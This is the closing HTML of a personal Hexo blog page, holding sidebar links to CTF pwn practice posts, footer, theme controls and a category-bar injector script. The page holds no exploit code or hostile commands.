title="buuctf刷题记录-2">buuctf刷题记录-2</a><time datetime="2023-03-27" title="发表于 2023-03-27">2023-03-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4569/" title="pwnable.kr刷题记录-1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/ixout/picture@main/img/back.jpg" alt="pwnable.kr刷题记录-1"></a><div class="content"><a class="title" href="/posts/4569/" title="pwnable.kr刷题记录-1">pwnable.kr刷题记录-1</a><time datetime="2023-03-20" title="发表于 2023-03-20">2023-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/10836/" title="pwnable.tw刷题记录-1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/ixout/picture@main/img/0494e94582eca2.png" alt="pwnable.tw刷题记录-1"></a><div class="content"><a class="title" href="/posts/10836/" title="pwnable.tw刷题记录-1">pwnable.tw刷题记录-1</a><time datetime="2023-03-20" title="发表于 2023-03-20">2023-03-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 By ixout</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script async src="/js/fps.js"></script><script async src="/js/title.js"></script><script src="/js/sun_moon.js" async></script><script async src="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="20px" data-random="false" async="async"></script></div><!-- hexo injector body_end start --><script data-pjax>
+    function butterfly_categories_card_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<style>li.categoryBar-list-item{width:32.3%;}.categoryBar-list{max-height: 190px;overflow:auto;}.categoryBar-list::-webkit-scrollbar{width:0!important}@media screen and (max-width: 650px){.categoryBar-list{max-height: 160px;}}</style><div class="recent-post-item" style="height:auto;width:100%;padding:0px;"><div id="categoryBar"><ul class="categoryBar-list"><li class="categoryBar-list-item" style="background:url(https://cdn.staticaly.com/gh/ixout/picture@main/img/b3e55d809568ce.jpg);"> <a class="categoryBar-list-link" href="categories/pwn/">pwn</a><span class="categoryBar-list-count">11</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(https://cdn.staticaly.com/gh/ixout/picture@main/img/96b26df8437c4.jpg);"> <a class="categoryBar-list-link" href="categories/题解/">题解</a><span class="categoryBar-list-count">5</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(https://cdn.staticaly.com/gh/ixout/picture@main/img/45663c9f2ce54eb.jpg);"> <a class="categoryBar-list-link" href="categories/杂烩/">杂烩</a><span class="categoryBar-list-count">2</span><span class="categoryBar-list-descr"></span></li></ul></div></div>';
+      console.log('已挂载butterfly_categories_card')
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      }
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    butterfly_categories_card_injector_config()
+    }
+  </script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>
